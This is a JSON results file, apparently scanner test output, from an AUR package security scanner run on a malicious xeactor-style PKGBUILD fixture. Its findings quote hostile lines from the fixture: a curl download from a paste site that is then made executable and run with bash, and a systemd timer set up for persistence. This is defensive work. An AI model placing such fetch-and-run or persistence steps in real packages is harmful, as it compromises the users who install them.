@@ -1,0 +1,190 @@
+{
+  "package_name": "acroread",
+  "package_version": "2.0.0-1",
+  "findings": [
+    {
+      "id": "PASTE-001",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Pastebin download",
+      "description": "Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 15,
+        "column": 5,
+        "snippet": "    curl https://ptpb.pw/~x -o ~/.x"
+      },
+      "recommendation": "Never download code from paste sites - this is a major red flag",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "curl https://ptpb.pw"
+      }
+    },
+    {
+      "id": "PASTE-001",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Pastebin download",
+      "description": "Downloading from paste sites is a common malware technique. Used in 2018 xeactor attack via ptpb.pw",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 15,
+        "column": 10,
+        "snippet": "    curl https://ptpb.pw/~x -o ~/.x"
+      },
+      "recommendation": "Never download code from paste sites - this is a major red flag",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "https://ptpb.pw/"
+      }
+    },
+    {
+      "id": "PERSIST-002",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "Systemd timer creation",
+      "description": "Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 26,
+        "column": 56,
+        "snippet": "    cat > \"${pkgdir}/etc/systemd/system/acroread-update.timer\" << EOF"
+      },
+      "recommendation": "Timers should be user-controlled; review carefully",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": ".timer"
+      }
+    },
+    {
+      "id": "PERSIST-002",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "Systemd timer creation",
+      "description": "Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 31,
+        "column": 1,
+        "snippet": "OnBootSec=60"
+      },
+      "recommendation": "Timers should be user-controlled; review carefully",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "OnBootSec"
+      }
+    },
+    {
+      "id": "PERSIST-002",
+      "severity": "critical",
+      "category": "persistence",
+      "title": "Systemd timer creation",
+      "description": "Creating systemd timers enables periodic malware execution. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 32,
+        "column": 1,
+        "snippet": "OnUnitActiveSec=360"
+      },
+      "recommendation": "Timers should be user-controlled; review carefully",
+      "cwe_id": "CWE-506",
+      "metadata": {
+        "matched_text": "OnUnitActiveSec"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 15,
+        "column": 32,
+        "snippet": "    curl https://ptpb.pw/~x -o ~/.x"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "~/.x"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 16,
+        "column": 14,
+        "snippet": "    chmod +x ~/.x"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "~/.x"
+      }
+    },
+    {
+      "id": "HIDDEN-001",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "Hidden file creation in home",
+      "description": "Creating hidden files in user home directory",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 19,
+        "column": 10,
+        "snippet": "    bash ~/.x"
+      },
+      "recommendation": "Packages should not create hidden files in user home",
+      "cwe_id": null,
+      "metadata": {
+        "matched_text": "~/.x"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": 13,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "/home/hippy/KS/projects/aur-security-scanner/tests/fixtures/malicious/xeactor-style/PKGBUILD"
+  ],
+  "timestamp": "2026-06-14T16:42:03.125398325Z",
+  "scan_duration_ms": 1
+}
